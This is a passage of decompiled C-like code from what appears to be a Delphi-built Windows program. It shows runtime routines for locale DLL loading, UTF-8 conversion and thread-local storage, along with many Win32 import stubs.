      if (hFindFile == (HANDLE)0xffffffff) {
        return local_14e._318_4_;
      }
      FindClose(hFindFile);
      iVar5 = lstrlenA(local_14e + 0x2c);
      if (0x105 < iVar5 + iVar2 + 2) {
        return local_14e._318_4_;
      }
      local_253[iVar2] = '\\';
      lstrcpynA(local_253 + iVar2 + 1,local_14e + 0x2c,0x104 - iVar2);
      iVar5 = lstrlenA(local_14e + 0x2c);
      iVar2 = iVar2 + iVar5 + 1;
      pcVar3 = pCVar4;
    }
    lstrcpynA(local_8,local_253,local_c);
  }
  else {
    lstrcpynA(local_8,local_253,local_c);
  }
  return local_14e._318_4_;
}



HMODULE FUN_00405d1c(LPCSTR param_1)

{
  LSTATUS LVar1;
  HMODULE pHVar2;
  LCID Locale;
  char *pcVar3;
  LPSTR lpString1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  LCTYPE LCType;
  int iVar5;
  char local_121 [261];
  DWORD local_1c;
  BYTE local_16 [4];
  undefined local_12;
  char local_11 [2];
  undefined local_f;
  HKEY local_c;
  LPCSTR local_8;
  
  local_8 = param_1;
  GetModuleFileNameA((HMODULE)0x0,local_121,0x105);
  local_16[0] = '\0';
  LVar1 = RegOpenKeyExA((HKEY)0x80000001,"Software\\Borland\\Locales",0,0xf0019,&local_c);
  if (LVar1 != 0) {
    LVar1 = RegOpenKeyExA((HKEY)0x80000002,"Software\\Borland\\Locales",0,0xf0019,&local_c);
    if (LVar1 != 0) {
      LVar1 = RegOpenKeyExA((HKEY)0x80000001,"Software\\Borland\\Delphi\\Locales",0,0xf0019,&local_c
                           );
      if (LVar1 != 0) {
        lstrcpynA(local_121,local_8,0x105);
        iVar5 = 5;
        pcVar3 = local_11;
        LCType = 3;
        Locale = GetThreadLocale();
        GetLocaleInfoA(Locale,LCType,pcVar3,iVar5);
        pHVar2 = (HMODULE)0x0;
        if ((local_121[0] != '\0') && ((local_11[0] != '\0' || (local_16[0] != '\0')))) {
          iVar5 = lstrlenA(local_121);
          for (pcVar3 = local_121 + iVar5; (*pcVar3 != '.' && (pcVar3 != local_121));
              pcVar3 = pcVar3 + -1) {
          }
          if (pcVar3 != local_121) {
            lpString1 = pcVar3 + 1;
            if (local_16[0] != '\0') {
              lstrcpynA(lpString1,(LPCSTR)local_16,0x105 - ((int)lpString1 - (int)local_121));
              pHVar2 = LoadLibraryExA(local_121,(HANDLE)0x0,2);
            }
            if ((pHVar2 == (HMODULE)0x0) && (local_11[0] != '\0')) {
              lstrcpynA(lpString1,local_11,0x105 - ((int)lpString1 - (int)local_121));
              pHVar2 = LoadLibraryExA(local_121,(HANDLE)0x0,2);
              if (pHVar2 == (HMODULE)0x0) {
                local_f = 0;
                lstrcpynA(lpString1,local_11,0x105 - ((int)lpString1 - (int)local_121));
                pHVar2 = LoadLibraryExA(local_121,(HANDLE)0x0,2);
              }
            }
          }
        }
        return pHVar2;
      }
    }
  }
  uVar4 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xfffffec8;
  local_1c = 5;
  FUN_00405b64(local_121,0x105);
  LVar1 = RegQueryValueExA(local_c,local_121,(LPDWORD)0x0,(LPDWORD)0x0,local_16,&local_1c);
  if (LVar1 != 0) {
    LVar1 = RegQueryValueExA(local_c,"",(LPDWORD)0x0,(LPDWORD)0x0,local_16,&local_1c);
    if (LVar1 != 0) {
      local_16[0] = '\0';
    }
  }
  local_12 = 0;
  *in_FS_OFFSET = uVar4;
  pHVar2 = (HMODULE)RegCloseKey(local_c);
  return pHVar2;
}



void FUN_00405f8c(undefined4 param_1)

{
  FUN_00405f9c(param_1);
  return;
}



void FUN_00405f94(int *param_1)

{
  FUN_00405fbc(param_1);
  return;
}



void FUN_00405f9c(undefined4 param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_004026a8(8);
  *puVar1 = DAT_0043f040;
  puVar1[1] = param_1;
  DAT_0043f040 = puVar1;
  return;
}



void FUN_00405fbc(int *param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  
  ppiVar2 = DAT_0043f040;
  if ((DAT_0043f040 != (int **)0x0) && (DAT_0043f040[1] == param_1)) {
    DAT_0043f040 = (int **)*DAT_0043f040;
    FUN_004026c8((int)ppiVar2);
    return;
  }
  if (DAT_0043f040 != (int **)0x0) {
    do {
      ppiVar1 = (int **)*ppiVar2;
      if ((ppiVar1 != (int **)0x0) && (ppiVar1[1] == param_1)) {
        *ppiVar2 = *ppiVar1;
        FUN_004026c8((int)ppiVar1);
        return;
      }
      ppiVar2 = (int **)*ppiVar2;
    } while (ppiVar2 != (int **)0x0);
  }
  return;
}



void FUN_0040601c(undefined4 param_1,undefined4 param_2,undefined *param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  int *local_c;
  
  local_c = DAT_0043f040;
  if (DAT_0043f040 != (int *)0x0) {
    do {
      puStack32 = &LAB_00406057;
      uStack36 = *in_FS_OFFSET;
      *in_FS_OFFSET = &uStack36;
      puStack28 = &stack0xfffffffc;
      (*(code *)local_c[1])(param_1,param_2,param_3);
      *in_FS_OFFSET = uStack36;
      local_c = (int *)*local_c;
      param_3 = puStack28;
      param_2 = uStack36;
    } while (local_c != (int *)0x0);
  }
  return;
}



void FUN_00406078(undefined4 *param_1)

{
  *param_1 = DAT_0043f03c;
  DAT_0043f03c = param_1;
  return;
}



void FUN_00406088(undefined4 *param_1,undefined4 param_2,undefined *param_3)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 *local_8;
  
  puStack12 = &stack0xfffffffc;
  puStack16 = &LAB_004060ec;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  local_8 = param_1;
  FUN_0040601c(param_1[1],0,param_3);
  *in_FS_OFFSET = uStack20;
  puVar1 = DAT_0043f03c;
  if (local_8 == DAT_0043f03c) {
    DAT_0043f03c = (undefined4 *)*local_8;
  }
  else {
    for (; puVar1 != (undefined4 *)0x0; puVar1 = (undefined4 *)*puVar1) {
      if ((undefined4 *)*puVar1 == local_8) {
        *puVar1 = *local_8;
        return;
      }
    }
  }
  return;
}



int ** FUN_004060f8(int **param_1)

{
  int **ppiVar1;
  
  ppiVar1 = (int **)*param_1;
  if (ppiVar1 != (int **)0x0) {
    *param_1 = (int *)0x0;
    (*(code *)(*ppiVar1)[2])();
    param_1 = ppiVar1;
  }
  return param_1;
}



void FUN_00406110(int **param_1,int **param_2)

{
  int *piVar1;
  
  if (param_2 == (int **)0x0) {
    piVar1 = *param_1;
    *param_1 = (int *)0x0;
    if (piVar1 != (int *)0x0) {
      (**(code **)(*piVar1 + 8))();
    }
    return;
  }
  (*(code *)(*param_2)[1])();
  piVar1 = *param_2;
  *param_2 = (int *)param_1;
  if (piVar1 == (int *)0x0) {
    return;
  }
  (**(code **)(*piVar1 + 8))();
  return;
}



void FUN_0040613c(int *param_1)

{
  if (param_1 != (int *)0x0) {
    (**(code **)(*param_1 + 4))();
  }
  return;
}



LONG FUN_004061b0(undefined param_1,undefined param_2,undefined param_3,int *param_4)

{
  LONG LVar1;
  
  LVar1 = InterlockedDecrement(param_4 + 1);
  if (LVar1 == 0) {
    (**(code **)(*param_4 + -4))(param_4,1);
  }
  return LVar1;
}



int FUN_004061d8(int param_1,uint param_2,int param_3,uint param_4)

{
  ushort uVar1;
  uint uVar2;
  byte bVar3;
  int iVar4;
  uint uVar5;
  
  iVar4 = 0;
  if (param_3 != 0) {
    uVar5 = 0;
    uVar2 = 0;
    if (param_1 == 0) {
      if (param_4 != 0) {
        do {
          uVar1 = *(ushort *)(param_3 + uVar2 * 2);
          uVar2 = uVar2 + 1;
          if (0x7f < uVar1) {
            if (0x7ff < uVar1) {
              uVar5 = uVar5 + 1;
            }
            uVar5 = uVar5 + 1;
          }
          uVar5 = uVar5 + 1;
        } while (uVar2 < param_4);
      }
    }
    else {
      while ((uVar2 < param_4 && (uVar5 < param_2))) {
        uVar1 = *(ushort *)(param_3 + uVar2 * 2);
        uVar2 = uVar2 + 1;
        bVar3 = (byte)uVar1;
        if (uVar1 < 0x80) {
          *(byte *)(param_1 + uVar5) = bVar3;
          uVar5 = uVar5 + 1;
        }
        else if (uVar1 < 0x800) {
          if (param_2 < uVar5 + 2) break;
          *(byte *)(param_1 + uVar5) = (byte)(uVar1 >> 6) | 0xc0;
          *(byte *)(param_1 + 1 + uVar5) = bVar3 & 0x3f | 0x80;
          uVar5 = uVar5 + 2;
        }
        else {
          if (param_2 < uVar5 + 3) break;
          *(byte *)(param_1 + uVar5) = (byte)(uVar1 >> 0xc) | 0xe0;
          *(byte *)(param_1 + 1 + uVar5) = (byte)(uVar1 >> 6) & 0x3f | 0x80;
          *(byte *)(param_1 + 2 + uVar5) = bVar3 & 0x3f | 0x80;
          uVar5 = uVar5 + 3;
        }
      }
      if (param_2 <= uVar5) {
        uVar5 = param_2 - 1;
      }
      *(undefined *)(param_1 + uVar5) = 0;
    }
    iVar4 = uVar5 + 1;
  }
  return iVar4;
}



int FUN_004062b4(int param_1,uint param_2,int param_3,uint param_4)

{
  byte *pbVar1;
  byte bVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  int local_14;
  
  if (param_3 == 0) {
    local_14 = 0;
  }
  else {
    uVar3 = 0;
    uVar5 = 0;
    if (param_1 == 0) {
      if (param_4 != 0) {
        do {
          uVar6 = uVar5 + 1;
          if ((*(byte *)(param_3 + uVar5) & 0x80) != 0) {
            if (param_4 <= uVar6) {
              return -1;
            }
            if ((*(byte *)(param_3 + uVar5) & 0x20) != 0) {
              pbVar1 = (byte *)(param_3 + uVar6);
              uVar6 = uVar5 + 2;
              if ((*pbVar1 & 0xc0) != 0x80) {
                return -1;
              }
              if (param_4 <= uVar6) {
                return -1;
              }
            }
            pbVar1 = (byte *)(param_3 + uVar6);
            uVar6 = uVar6 + 1;
            if ((*pbVar1 & 0xc0) != 0x80) {
              return -1;
            }
          }
          uVar3 = uVar3 + 1;
          uVar5 = uVar6;
        } while (uVar6 < param_4);
      }
    }
    else {
      for (; (uVar5 < param_4 && (uVar3 < param_2)); uVar3 = uVar3 + 1) {
        bVar2 = *(byte *)(param_3 + uVar5);
        uVar6 = uVar5 + 1;
        if ((bVar2 & 0x80) == 0) {
          *(ushort *)(param_1 + uVar3 * 2) = (ushort)bVar2;
        }
        else {
          if (param_4 <= uVar6) {
            return -1;
          }
          uVar4 = bVar2 & 0x3f;
          if ((bVar2 & 0x20) != 0) {
            pbVar1 = (byte *)(param_3 + uVar6);
            uVar6 = uVar5 + 2;
            if ((*pbVar1 & 0xc0) != 0x80) {
              return -1;
            }
            if (param_4 <= uVar6) {
              return -1;
            }
            uVar4 = (uint)(*pbVar1 & 0x3f) | uVar4 << 6;
          }
          pbVar1 = (byte *)(param_3 + uVar6);
          uVar6 = uVar6 + 1;
          if ((*pbVar1 & 0xc0) != 0x80) {
            return -1;
          }
          *(ushort *)(param_1 + uVar3 * 2) = (ushort)(*pbVar1 & 0x3f) | (ushort)(uVar4 << 6);
        }
        uVar5 = uVar6;
      }
      if (param_2 <= uVar3) {
        uVar3 = param_2 - 1;
      }
      *(undefined2 *)(param_1 + uVar3 * 2) = 0;
    }
    local_14 = uVar3 + 1;
  }
  return local_14;
}



void FUN_004063ec(int *param_1,int *param_2)

{
  uint uVar1;
  int iVar2;
  undefined *puVar3;
  undefined *puVar4;
  undefined4 *in_FS_OFFSET;
  bool bVar5;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  undefined4 *local_8;
  
  puStack20 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack24 = &LAB_0040648b;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  FUN_004047a8(param_2);
  bVar5 = true;
  FUN_00404fcc(param_1,(int *)0x0);
  if (!bVar5) {
    uVar1 = FUN_00404fc0((uint)param_1);
    FUN_00404d98((int *)&local_8,uVar1 * 3);
    uVar1 = FUN_00404fc0((uint)param_1);
    iVar2 = FUN_00404a68((int)local_8);
    puVar3 = FUN_00404fb0((undefined *)param_1);
    puVar4 = FUN_00404c68((undefined *)local_8);
    iVar2 = FUN_004061d8((int)puVar4,iVar2 + 1,(int)puVar3,uVar1);
    if (iVar2 < 1) {
      FUN_004047a8((int *)&local_8);
    }
    else {
      FUN_00404d98((int *)&local_8,iVar2 - 1);
    }
    FUN_004047fc(param_2,local_8);
  }
  *in_FS_OFFSET = uStack28;
  puStack20 = &LAB_00406492;
  puStack24 = (undefined *)0x40648a;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00406498(undefined *param_1,BSTR *param_2)

{
  UINT UVar1;
  uint uVar2;
  uint uVar3;
  undefined *puVar4;
  undefined *puVar5;
  int iVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  OLECHAR *local_8;
  
  puStack20 = &stack0xfffffffc;
  local_8 = (OLECHAR *)0x0;
  puStack24 = &LAB_0040652f;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  FUN_00404e54(param_2);
  if (param_1 != (undefined *)0x0) {
    UVar1 = FUN_00404a68((int)param_1);
    FUN_0040509c(&local_8,UVar1);
    uVar2 = FUN_00404a68((int)param_1);
    uVar3 = FUN_00404fc0((uint)local_8);
    puVar4 = FUN_00404c68(param_1);
    puVar5 = FUN_00404fb0((undefined *)local_8);
    iVar6 = FUN_004062b4((int)puVar5,uVar3 + 1,(int)puVar4,uVar2);
    if (iVar6 < 1) {
      FUN_00404e54(&local_8);
    }
    else {
      FUN_0040509c(&local_8,iVar6 - 1);
    }
    FUN_00404e90(param_2,local_8);
  }
  *in_FS_OFFSET = uStack28;
  puStack20 = &LAB_00406536;
  puStack24 = (undefined *)0x40652e;
  FUN_00404e54(&local_8);
  return;
}



void FUN_0040653c(LPCSTR param_1,int *param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  int *local_8;
  
  puStack20 = &stack0xfffffffc;
  local_8 = (int *)0x0;
  puStack24 = &LAB_0040657f;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  FUN_00404fa0((BSTR *)&local_8,param_1);
  FUN_004063ec(local_8,param_2);
  *in_FS_OFFSET = uStack28;
  puStack20 = &LAB_00406586;
  puStack24 = (undefined *)0x40657e;
  FUN_00404e54((BSTR *)&local_8);
  return;
}



void FUN_0040658c(int **param_1,int *param_2)

{
  HINSTANCE hInstance;
  uint uVar1;
  int *uID;
  undefined4 *lpBuffer;
  int cchBufferMax;
  undefined4 local_408 [256];
  
  lpBuffer = local_408;
  if (param_1 != (int **)0x0) {
    if ((int)param_1[1] < 0x10000) {
      cchBufferMax = 0x400;
      uID = param_1[1];
      hInstance = (HINSTANCE)FUN_00405b28(**param_1);
      uVar1 = LoadStringA(hInstance,(UINT)uID,(LPSTR)lpBuffer,cchBufferMax);
      FUN_00404898(param_2,local_408,uVar1);
    }
    else {
      FUN_004049a0(param_2,param_1[1]);
    }
  }
  return;
}



void FUN_004065e4(LCID param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  byte *local_14;
  undefined4 local_f;
  int local_8;
  
  puStack28 = &stack0xfffffffc;
  local_14 = (byte *)0x0;
  puStack32 = &DAT_0040664a;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  GetLocaleInfoA(param_1,0x1004,(LPSTR)&local_f,7);
  FUN_00404a18((int *)&local_14,&local_f,7);
  FUN_004033dc(local_14,&local_8);
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_00406651;
  puStack32 = (undefined *)0x406649;
  FUN_004047a8((int *)&local_14);
  return;
}



// WARNING: Exceeded maximum restarts with more pending

HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406780. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HMODULE)GetModuleHandleA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HLOCAL __stdcall LocalAlloc(UINT uFlags,SIZE_T uBytes)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406788. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HLOCAL)LocalAlloc();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406790. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (LPVOID)TlsGetValue();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall TlsSetValue(DWORD dwTlsIndex,LPVOID lpTlsValue)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406798. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TlsSetValue();
  return BVar1;
}



void FUN_004067a0(SIZE_T param_1)

{
  LocalAlloc(0x40,param_1);
  return;
}



undefined4 FUN_004067ac(void)

{
  return 0xc;
}



void FUN_004067b4(void)

{
  SIZE_T SVar1;
  LPVOID lpTlsValue;
  
  SVar1 = FUN_004067ac();
  if (SVar1 != 0) {
    if (DAT_0043f0c4 == 0xffffffff) {
      FUN_0040479c(0xe2);
    }
    lpTlsValue = (LPVOID)FUN_004067a0(SVar1);
    if (lpTlsValue == (LPVOID)0x0) {
      FUN_0040479c(0xe2);
    }
    else {
      TlsSetValue(DAT_0043f0c4,lpTlsValue);
    }
  }
  return;
}



LPVOID FUN_004067f8(void)

{
  LPVOID pvVar1;
  int in_FS_OFFSET;
  
  if (DAT_0044265c == '\0') {
    return *(LPVOID *)(*(int *)(in_FS_OFFSET + 0x2c) + DAT_0043f0c4 * 4);
  }
  pvVar1 = TlsGetValue(DAT_0043f0c4);
  if (pvVar1 != (LPVOID)0x0) {
    return pvVar1;
  }
  FUN_004067b4();
  pvVar1 = TlsGetValue(DAT_0043f0c4);
  if (pvVar1 != (LPVOID)0x0) {
    return pvVar1;
  }
  return DAT_00442668;
}



void FUN_00406838(void)

{
  FUN_00406078((undefined4 *)&DAT_0043f0cc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00406844(undefined4 param_1)

{
  DAT_0043f0c4 = 0;
  _DAT_0043f0d0 = GetModuleHandleA((LPCSTR)0x0);
  _DAT_0043f0d4 = 0;
  _DAT_0043f0d8 = 0;
  DAT_00442660 = _DAT_0043f0d0;
  FUN_00406838();
  FUN_00404514(param_1,(int)&DAT_0043f0cc);
  return;
}



void FUN_004068c0(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4,
                 undefined4 param_5)

{
  *param_4 = param_1;
  param_4[1] = param_2;
  param_4[3] = param_5;
  param_4[2] = param_3;
  return;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
AllocateAndInitializeSid
          (PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority,BYTE nSubAuthorityCount,
          DWORD nSubAuthority0,DWORD nSubAuthority1,DWORD nSubAuthority2,DWORD nSubAuthority3,
          DWORD nSubAuthority4,DWORD nSubAuthority5,DWORD nSubAuthority6,DWORD nSubAuthority7,
          PSID *pSid)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406914. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = AllocateAndInitializeSid();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall EqualSid(PSID pSid1,PSID pSid2)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040691c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = EqualSid();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

PVOID __stdcall FreeSid(PSID pSid)

{
  PVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406924. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (PVOID)FreeSid();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
GetTokenInformation(HANDLE TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,
                   LPVOID TokenInformation,DWORD TokenInformationLength,PDWORD ReturnLength)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040692c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetTokenInformation();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406934. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = OpenProcessToken();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
OpenThreadToken(HANDLE ThreadHandle,DWORD DesiredAccess,BOOL OpenAsSelf,PHANDLE TokenHandle)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040693c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = OpenThreadToken();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall RegCloseKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406944. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCloseKey();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall
RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,
               REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,
               LPDWORD lpdwDisposition)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040694c. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCreateKeyExA();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall RegFlushKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406954. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegFlushKey();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall
RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040695c. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegOpenKeyExA();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall
RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,BYTE *lpData,DWORD cbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406964. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegSetValueExA();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040696c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseHandle();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall
CompareStringA(LCID Locale,DWORD dwCmpFlags,PCNZCH lpString1,int cchCount1,PCNZCH lpString2,
              int cchCount2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406974. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = CompareStringA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall CreateDirectoryA(LPCSTR lpPathName,LPSECURITY_ATTRIBUTES lpSecurityAttributes)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040697c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CreateDirectoryA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall
CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes,BOOL bManualReset,BOOL bInitialState,
            LPCSTR lpName)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406984. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)CreateEventA();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall
CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
           LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
           DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040698c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)CreateFileA();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00406994. Too many branches
                    // WARNING: Treating indirect jump as call
  DeleteCriticalSection();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x0040699c. Too many branches
                    // WARNING: Treating indirect jump as call
  EnterCriticalSection();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
EnumCalendarInfoA(CALINFO_ENUMPROCA lpCalInfoEnumProc,LCID Locale,CALID Calendar,CALTYPE CalType)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069a4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = EnumCalendarInfoA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall FileTimeToDosDateTime(FILETIME *lpFileTime,LPWORD lpFatDate,LPWORD lpFatTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069ac. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FileTimeToDosDateTime();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall FileTimeToLocalFileTime(FILETIME *lpFileTime,LPFILETIME lpLocalFileTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069b4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FileTimeToLocalFileTime();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall FindClose(HANDLE hFindFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069bc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindClose();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069c4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)FindFirstFileA();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall FindNextFileA(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069cc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindNextFileA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HRSRC __stdcall FindResourceA(HMODULE hModule,LPCSTR lpName,LPCSTR lpType)

{
  HRSRC pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069d4. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HRSRC)FindResourceA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall
FormatMessageA(DWORD dwFlags,LPCVOID lpSource,DWORD dwMessageId,DWORD dwLanguageId,LPSTR lpBuffer,
              DWORD nSize,va_list *Arguments)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069dc. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = FormatMessageA();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall FreeResource(HGLOBAL hResData)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069e4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FreeResource();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall GetACP(void)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069ec. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetACP();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall GetCPInfo(UINT CodePage,LPCPINFO lpCPInfo)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069f4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetCPInfo();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall GetCurrentProcess(void)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004069fc. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)GetCurrentProcess();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetCurrentProcessId(void)

{
  DWORD DVar1;
  
